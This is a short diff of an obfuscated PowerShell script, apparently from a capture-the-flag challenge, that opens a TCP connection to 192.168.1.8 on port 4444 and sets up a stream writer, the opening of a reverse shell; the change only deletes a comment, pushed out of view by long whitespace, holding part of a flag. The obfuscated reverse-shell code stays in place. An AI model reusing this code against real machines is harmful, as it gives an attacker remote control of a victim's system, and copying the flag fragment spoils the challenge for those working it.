@@ -1,4 +1,4 @@
-$iP=(-join('192.1','68.1.','8'));$pO=4444;                                                                                                                                                                                           #FLag 1/2 Hitu{u_di
+$iP=(-join('192.1','68.1.','8'));$pO=4444;                                                                                                                                                                                           
 $tC=(NeW-OBJecT Net.SoCKEtS.tCpcLiENT($iP,$pO));
 $Ns=$tC.GetStREaM();
 $SW=(New-OBJeCT Io.STrEamwRiTER($Ns));
